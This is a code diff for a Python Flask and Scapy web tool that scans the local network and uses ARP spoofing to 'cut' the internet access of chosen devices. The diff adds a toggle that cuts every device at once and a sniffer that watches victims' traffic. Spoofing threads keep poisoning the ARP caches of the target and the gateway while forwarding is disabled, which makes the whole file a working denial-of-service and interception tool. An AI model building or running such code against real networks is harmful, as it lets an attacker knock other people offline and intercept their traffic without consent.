@@ -6,12 +6,29 @@ import threading
 import json
 import socket
 from flask import Flask, render_template, jsonify, request
-from scapy.all import ARP, Ether, srp, sendp, conf, IP, UDP, sr1
+from scapy.all import ARP, Ether, srp, sendp, conf, IP, UDP, sr1, sniff
 from scapy.layers.netbios import NBNSQueryRequest, NBNSNodeStatusResponse
 from flask_cors import CORS
 
 app = Flask(__name__)
 CORS(app)
+
+# --- Configuration & Storage ---
+DB_FILE = "devices.json"
+
+def load_db():
+    if os.path.exists(DB_FILE):
+        try:
+            with open(DB_FILE, 'r') as f:
+                return json.load(f)
+        except: pass
+    return {"devices": {}}
+
+def save_db(db):
+    try:
+        with open(DB_FILE, 'w') as f:
+            json.dump(db, f, indent=4)
+    except: pass
 
 # --- Network Configuration Utilities ---
 
@@ -107,13 +124,18 @@ class ArpManager:
         self.gateway_ip = self._detect_gateway()
         self.interface = conf.iface
         self.gateway_mac = self._get_mac(self.gateway_ip) if self.gateway_ip else None
-        self.active_targets = {}  # {ip: {"mac": mac, "name": name, "vendor": vendor, "thread": thread, "running": bool}}
+        self.active_targets = {} 
+        self.bandwidth_stats = {} # {ip: {"bytes": 0, "last_kbps": 0, "last_time": time.time()}}
         self.is_running = True
+        self.global_state = False # True = Everyone Cut
         self._init_system()
+        
+        # Start Sniffing Thread
+        self.sniff_thread = threading.Thread(target=self._sniff_loop)
+        self.sniff_thread.daemon = True
+        self.sniff_thread.start()
 
     def _init_system(self):
-        """Prepare system settings"""
-        # We start with IP forwarding OFF to ensure 'Cut' works by default
         self._toggle_ip_forwarding(enable=False)
 
     def _detect_gateway(self):
@@ -131,6 +153,44 @@ class ArpManager:
         ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=False)
         if ans: return ans[0][1].hwsrc
         return None
+
+    def _sniff_loop(self):
+        """Sniff packets to calculate bandwidth per IP"""
+        def packet_handler(pkt):
+            if pkt.haslayer(IP):
+                src = pkt[IP].src
+                dst = pkt[IP].dst
+                size = len(pkt)
+                for ip in [src, dst]:
+                    if ip not in self.bandwidth_stats:
+                        self.bandwidth_stats[ip] = {"bytes": 0, "last_kbps": 0, "last_time": time.time()}
+                    self.bandwidth_stats[ip]["bytes"] += size
+
+        sniff(iface=self.interface, prn=packet_handler, store=0)
+
+    def get_bandwidth(self, ip):
+        stats = self.bandwidth_stats.get(ip)
+        if not stats: return 0
+        
+        now = time.time()
+        elapsed = now - stats["last_time"]
+        if elapsed >= 1.0:
+            kbps = (stats["bytes"] * 8) / (elapsed * 1024) # kbps
+            stats["last_kbps"] = round(kbps, 2)
+            stats["bytes"] = 0
+            stats["last_time"] = now
+        return stats["last_kbps"]
+
+    def _detect_icon(self, vendor, name):
+        name = name.lower()
+        vendor = vendor.lower()
+        if "apple" in vendor or "iphone" in name or "ipad" in name: return "mobile-alt"
+        if "samsung" in vendor or "vivo" in vendor or "oppo" in vendor or "xiaomi" in vendor or "infinix" in vendor: return "mobile-alt"
+        if "tv" in name or "smart" in name or "bravia" in name: return "tv"
+        if "playstation" in name or "xbox" in name or "nintendo" in name: return "gamepad"
+        if "desktop" in name or "pc" in name: return "desktop"
+        if "laptop" in name or "hp" in vendor or "dell" in vendor or "lenovo" in vendor: return "laptop"
+        return "laptop"
 
     def _get_hostname(self, ip):
         """Multi-protocol Hostname Discovery (DNS, NBNS, mDNS)"""
@@ -155,70 +215,74 @@ class ArpManager:
         ip_range = ".".join(self.gateway_ip.split(".")[:-1]) + ".0/24"
         
         # Rapid ARP Scan
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=3, verbose=False)
+        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip_range), timeout=2, verbose=False)
         
+        db = load_db()["devices"]
         devices = []
         for _, rec in ans:
             ip = rec.psrc
             mac = rec.hwsrc
-            if ip == self.gateway_ip: continue # Skip gateway itself
+            if ip == self.gateway_ip: continue
             
             # Lookup Vendor
             oui = mac.upper()[:8]
             vendor = VENDORS.get(oui, "Unknown Vendor")
             
             # If still unknown, check for Randomized MAC pattern
-            if vendor == "Unknown Vendor":
-                # Check for locally administered bit (2nd digit: 2, 6, A, E)
-                if oui[1] in '26AE':
-                    vendor = "Randomized (Private) MAC"
-                else:
-                    # Deep prefix check
-                    for prefix, name in VENDORS.items():
-                        if oui.startswith(prefix):
-                            vendor = name
-                            break
+            if vendor == "Unknown Vendor" and oui[1] in '26AE':
+                vendor = "Randomized (Private) MAC"
+            elif vendor == "Unknown Vendor":
+                for prefix, name in VENDORS.items():
+                    if oui.startswith(prefix):
+                        vendor = name
+                        break
             
-            name = self._get_hostname(ip)
-            is_attacking = ip in self.active_targets and self.active_targets[ip]["running"]
+            # Persistent Data
+            saved_info = db.get(mac, {})
+            name = saved_info.get("name") or self._get_hostname(ip)
+            icon = saved_info.get("icon") or self._detect_icon(vendor, name)
             
-            devices.append({"ip": ip, "mac": mac, "vendor": vendor, "name": name, "attacking": is_attacking})
+            is_attacking = (ip in self.active_targets and self.active_targets[ip]["running"]) or self.global_state
+            
+            devices.append({
+                "ip": ip, "mac": mac, "vendor": vendor, 
+                "name": name, "icon": icon,
+                "attacking": is_attacking,
+                "bandwidth": self.get_bandwidth(ip)
+            })
         return devices
 
     def _spoof_loop(self, target_ip, target_mac):
-        """Individual spoofing thread for a target"""
-        # Fixed Scapy warnings by explicitly providing the Ethernet layer with destination MAC
-        # Tell target I am gateway
         pkt_target = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=self.gateway_ip)
-        # Tell gateway I am target
         pkt_gateway = Ether(dst=self.gateway_mac)/ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=target_ip)
         
-        while self.is_running and target_ip in self.active_targets and self.active_targets[target_ip]["running"]:
-            sendp(pkt_target, verbose=False)
-            sendp(pkt_gateway, verbose=False)
-            time.sleep(1.5) # Slightly faster spoofing for stability
+        while self.is_running:
+            if self.global_state or (target_ip in self.active_targets and self.active_targets[target_ip]["running"]):
+                sendp(pkt_target, verbose=False)
+                sendp(pkt_gateway, verbose=False)
+            else: break
+            time.sleep(1.5)
 
     def toggle_attack(self, ip, mac, state):
-        """Enable or disable spoofing for a specific IP"""
-        if state: # Start attack
+        if state:
             if ip not in self.active_targets:
                 self.active_targets[ip] = {"mac": mac, "running": True}
-                t = threading.Thread(target=self._spoof_loop, args=(ip, mac))
-                t.daemon = True
-                self.active_targets[ip]["thread"] = t
-                t.start()
+                threading.Thread(target=self._spoof_loop, args=(ip, mac), daemon=True).start()
             else:
                 self.active_targets[ip]["running"] = True
-                if not self.active_targets[ip]["thread"].is_alive():
-                    t = threading.Thread(target=self._spoof_loop, args=(ip, mac))
-                    t.daemon = True
-                    self.active_targets[ip]["thread"] = t
-                    t.start()
-        else: # Stop attack
+        else:
             if ip in self.active_targets:
                 self.active_targets[ip]["running"] = False
-                # Send restoration packets
                 self._restore(ip, mac)
+
+    def toggle_all(self, state, devices=None):
+        self.global_state = state
+        if state and devices:
+            for dev in devices:
+                self.toggle_attack(dev['ip'], dev['mac'], True)
+        elif not state:
+            for ip in list(self.active_targets.keys()):
+                self.toggle_attack(ip, self.active_targets[ip]['mac'], False)
 
     def _restore(self, ip, mac):
         pkt_target = Ether(dst=mac)/ARP(op=2, pdst=ip, hwdst=mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
@@ -229,14 +293,10 @@ class ArpManager:
     def stop_all(self):
         self.is_running = False
         for ip, info in self.active_targets.items():
-            info["running"] = False
             self._restore(ip, info["mac"])
         self._toggle_ip_forwarding(enable=True)
 
-# Initialize Manager
 manager = ArpManager()
-
-# --- Flask Routes ---
 
 @app.route('/')
 def index():
@@ -253,20 +313,28 @@ def api_scan():
 @app.route('/api/toggle', methods=['POST'])
 def api_toggle():
     data = request.json
-    ip = data.get('ip')
-    mac = data.get('mac')
-    state = data.get('state') # True to cut, False to restore
-    if not ip or not mac: return jsonify({"status": "error", "message": "Missing IP/MAC"}), 400
-    
-    manager.toggle_attack(ip, mac, state)
-    return jsonify({"status": "success", "ip": ip, "state": state})
+    manager.toggle_attack(data['ip'], data['mac'], data['state'])
+    return jsonify({"status": "success"})
+
+@app.route('/api/toggle_all', methods=['POST'])
+def api_toggle_all():
+    data = request.json
+    manager.toggle_all(data['state'], data.get('devices'))
+    return jsonify({"status": "success"})
+
+@app.route('/api/nickname', methods=['POST'])
+def set_nickname():
+    data = request.json # {mac, name, icon}
+    db = load_db()
+    db["devices"][data['mac']] = {"name": data['name'], "icon": data['icon']}
+    save_db(db)
+    return jsonify({"status": "success"})
 
 @app.route('/api/status')
 def api_status():
-    status = []
-    for ip, info in manager.active_targets.items():
-        if info["running"]: status.append(ip)
-    return jsonify({"status": "success", "attacking": status})
+    # Only return bandwidth for already discovered devices to minimize scan time
+    stats = {ip: manager.get_bandwidth(ip) for ip in manager.bandwidth_stats.keys()}
+    return jsonify({"status": "success", "bandwidth": stats, "global_state": manager.global_state})
 
 if __name__ == '__main__':
     if os.getuid() != 0:
